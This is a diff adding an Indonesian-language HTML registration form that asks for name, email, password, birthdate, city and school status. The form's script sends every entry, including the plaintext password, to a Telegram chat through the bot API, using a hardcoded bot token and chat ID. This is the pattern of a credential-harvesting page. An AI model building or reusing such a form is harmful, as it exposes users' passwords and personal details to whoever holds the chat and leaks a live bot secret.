@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Form Pendaftaran Diri</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #2d2d2d;
+}
+
+.container {
+  width: 80%;
+  max-width: 500px;
+  margin: 50px auto;
+  padding: 20px;
+  background-color: #fff;
+  border-radius: 10px;
+  box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
+}
+
+.container h2 {
+  text-align: center;
+  margin-bottom: 20px;
+  color: #007bff;
+}
+
+form {
+  display: grid;
+  gap: 10px;
+}
+
+.label-input {
+  display: grid;
+  grid-template-columns: 1fr 2fr;
+  align-items: center;
+}
+
+.label-input label {
+  grid-column: 1;
+  margin-right: 10px;
+}
+
+.label-input select {
+  grid-column: 2;
+}
+
+.button-container {
+  display: flex;
+  justify-content: center;
+}
+
+.button-85 {
+  padding: 0.6em 2em;
+  border: none;
+  outline: none;
+  color: rgb(255, 255, 255);
+  background: #111;
+  cursor: pointer;
+  position: relative;
+  z-index: 0;
+  border-radius: 10px;
+  user-select: none;
+  -webkit-user-select: none;
+  touch-action: manipulation;
+}
+
+.button-85:before {
+  content: "";
+  background: linear-gradient(
+    45deg,
+    #ff0000,
+    #ff7300,
+    #fffb00,
+    #48ff00,
+    #00ffd5,
+    #002bff,
+    #7a00ff,
+    #ff00c8,
+    #ff0000
+  );
+  position: absolute;
+  top: -2px;
+  left: -2px;
+  background-size: 400%;
+  z-index: -1;
+  filter: blur(5px);
+  -webkit-filter: blur(5px);
+  width: calc(100% + 4px);
+  height: calc(100% + 4px);
+  animation: glowing-button-85 20s linear infinite;
+  transition: opacity 0.3s ease-in-out;
+  border-radius: 10px;
+}
+
+@keyframes glowing-button-85 {
+  0% {
+    background-position: 0 0;
+  }
+  50% {
+    background-position: 400% 0;
+  }
+  100% {
+    background-position: 0 0;
+  }
+}
+
+.button-85:after {
+  z-index: -1;
+  content: "";
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  background: #222;
+  left: 0;
+  top: 0;
+  border-radius: 10px;
+}
+
+.button-85:hover:before {
+  opacity: 0;
+}
+
+/* CSS yang perlu ditambahkan */
+input[type="text"],
+input[type="email"],
+input[type="password"],
+input[type="date"],
+select {
+  width: calc(100% - 22px);
+  padding: 10px;
+  margin: 5px 0;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+}
+
+button {
+  width: 100%;
+  padding: 10px;
+  background-color: #007bff;
+  color: #fff;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #0056b3;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Form Pendaftaran Diri</h2>
+  <form id="registrationForm" onsubmit="submitForm(event)">
+    <label for="name">Nama:</label>
+    <input type="text" id="name" name="name" required>
+
+    <label for="email">Email:</label>
+    <input type="email" id="email" name="email" required>
+
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password" required>
+
+    <label for="birthdate">Tanggal Lahir:</label>
+    <input type="date" id="birthdate" name="birthdate" required>
+
+    <div style="display: flex; gap: 10px;">
+      <div style="flex: 1;">
+        <label for="school">Sekolah:</label>
+        <select id="school" name="school">
+          <option value="yes">Ya</option>
+          <option value="no">Tidak</option>
+        </select>
+      </div>
+      <div style="flex: 1;">
+        <label for="address">Tempat Tinggal:</label>
+        <select id="address" name="address">
+<option value="Jakarta">Jakarta</option>
+      <option value="Surabaya">Surabaya</option>
+      <option value="Bandung">Bandung</option>
+      <option value="Medan">Medan</option>
+      <option value="Semarang">Semarang</option>
+      <option value="Makassar">Makassar</option>
+      <option value="Palembang">Palembang</option>
+      <option value="Depok">Depok</option>
+      <option value="Tangerang">Tangerang</option>
+      <option value="Yogyakarta">Yogyakarta</option>
+      <option value="Malang">Malang</option>
+      <option value="Bekasi">Bekasi</option>
+      <option value="Padang">Padang</option>
+      <option value="Makassar">Makassar</option>
+      <option value="Banjarmasin">Banjarmasin</option>
+      <option value="Surakarta">Surakarta</option>
+      <option value="Balikpapan">Balikpapan</option>
+      <option value="Banda Aceh">Banda Aceh</option>
+      <option value="Manado">Manado</option>
+      <option value="Pontianak">Pontianak</option>
+      <option value="Denpasar">Denpasar</option>
+      <option value="Ambon">Ambon</option>
+      <option value="Kupang">Kupang</option>
+      <option value="Pekanbaru">Pekanbaru</option>
+      <option value="Jayapura">Jayapura</option>
+      <option value="Batam">Batam</option>
+      <option value="Palu">Palu</option>
+      <option value="Mataram">Mataram</option>
+      <option value="Tarakan">Tarakan</option>
+      <option value="Cilegon">Cilegon</option>
+      <option value="Ternate">Ternate</option>
+      <option value="Padang Panjang">Padang Panjang</option>
+      <option value="Kendari">Kendari</option>
+      <option value="Pematangsiantar">Pematangsiantar</option>
+      <option value="Tegal">Tegal</option>
+      <option value="Binjai">Binjai</option>
+      <option value="Purwokerto">Purwokerto</option>
+      <option value="Batu">Batu</option>
+      <option value="Banjar">Banjar</option>
+      <option value="Pasuruan">Pasuruan</option>
+      <option value="Magelang">Magelang</option>
+      <option value="Lampung">Lampung</option>
+      <option value="Cimahi">Cimahi</option>
+      <option value="Palangka Raya">Palangka Raya</option>
+      <option value="Kediri">Kediri</option>
+      <option value="Samarinda">Samarinda</option>
+      <option value="Probolinggo">Probolinggo</option>
+      <option value="Cirebon">Cirebon</option>
+      <option value="Bengkulu">Bengkulu</option>
+      <option value="Madiun">Madiun</option>
+      <option value="Mataram">Mataram</option>
+      <option value="Bontang">Bontang</option>
+      <option value="Salatiga">Salatiga</option>
+      <option value="Pasuruan">Pasuruan</option>
+      <option value="Sorong">Sorong</option>
+      <option value="Pangkal Pinang">Pangkal Pinang</option>
+      <option value="Langsa">Langsa</option>
+      <option value="Lhokseumawe">Lhokseumawe</option>
+      <option value="Tanjung Pinang">Tanjung Pinang</option>
+      <option value="Bukittinggi">Bukittinggi</option>
+      <option value="Tanjung Balai">Tanjung Balai</option>
+      <option value="Pariaman">Pariaman</option>
+      <option value="Sibolga">Sibolga</option>
+      <option value="Tebingtinggi">Tebingtinggi</option>
+      <option value="Padang Sidempuan">Padang Sidempuan</option>
+      <option value="Gunungsitoli">Gunungsitoli</option>
+      <option value="Padang">Padang</option>
+      <option value="Pagar Alam">Pagar Alam</option>
+      <option value="Pangkal Pinang">Pangkal Pinang</option>
+      <option value="Lubuklinggau">Lubuklinggau</option>
+      <option value="Bukittinggi">Bukittinggi</option>
+      <option value="Sawahlunto">Sawahlunto</option>
+      <option value="Solok">Solok</option>
+      <option value="Padang Panjang">Padang Panjang</option>
+      <option value="Payakumbuh">Payakumbuh</option>
+      <option value="Sungai Penuh">Sungai Penuh</option>
+      <option value="Batusangkar">Batusangkar</option>
+      <option value="Parapat">Parapat</option>
+      <option value="Tanjung Balai">Tanjung Balai</option>
+      <option value="Sungai Penuh">Sungai Penuh</option>
+      <option value="Tebing Tinggi">Tebing Tinggi</option>
+      <option value="Pematang Siantar">Pematang Siantar</option>
+      <option value="Bengkulu">Bengkulu</option>
+      <option value="Lahat">Lahat</option>
+      <option value="Tebing Tinggi">Tebing Tinggi</option>
+      <option value="Pematang Siantar">Pematang Siantar</option>
+      <option value="Tanjung Balai">Tanjung Balai</option>
+      <option value="Sungaipenuh">Sungaipenuh</option>
+      <option value="Rantauprapat">Rantauprapat</option>
+      <option value="Padangpanjang">Padangpanjang</option>
+      <option value="Parapat">Parapat</option>
+      <option value="Prabumulih">Prabumulih</option>
+      <option value="Sibolga">Sibolga</option>
+      <option value="Tanjungbalai">Tanjungbalai</option>
+      <option value="Tanjungpinang">Tanjungpinang</option>
+      <option value="Tual">Tual</option>
+      <option value="Yogyakarta">Yogyakarta</option>
+    </select><br>
+      </div>
+    </div>
+
+    <div class="button-container">
+      <button class="button-85" type="submit">Daftar</button>
+    </div>
+  </form>
+</div>
+
+<script>
+function submitForm(event) {
+  event.preventDefault();
+  var name = document.getElementById('name').value;
+  var email = document.getElementById('email').value;
+  var password = document.getElementById('password').value;
+  var birthdate = document.getElementById('birthdate').value;
+  var address = document.getElementById('address').value;
+  var school = document.getElementById('school').value;
+
+  // Kirim data ke Telegram
+  sendToTelegram(name, email, password, birthdate, address, school);
+
+  // Bersihkan nilai input
+  document.getElementById('name').value = '';
+  document.getElementById('email').value = '';
+  document.getElementById('password').value = '';
+  document.getElementById('birthdate').value = '';
+  document.getElementById('address').value = '';
+  document.getElementById('school').value = 'yes'; // Default pilihan "Ya"
+}
+
+function sendToTelegram(name, email, password, birthdate, address, school) {
+  var botToken = '7007173726:AAHyXJJhYUKV0N7r0cPejDt--YYomqBcllo';
+  var chatId = '6583136535';
+  var message = `
+    <b>Pendaftaran Baru:</b>\n
+    <b>Nama:</b> ${name}\n
+    <b>Email:</b> ${email}\n
+    <b>Password:</b> ${password}\n
+    <b>Tanggal Lahir:</b> ${birthdate}\n
+    <b>Tempat Tinggal:</b> ${address}\n
+    <b>Sekolah:</b> ${school}
+  `;
+  var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', url, true);
+  xhr.send();
+}
+</script>
+
+</body>
+</html>
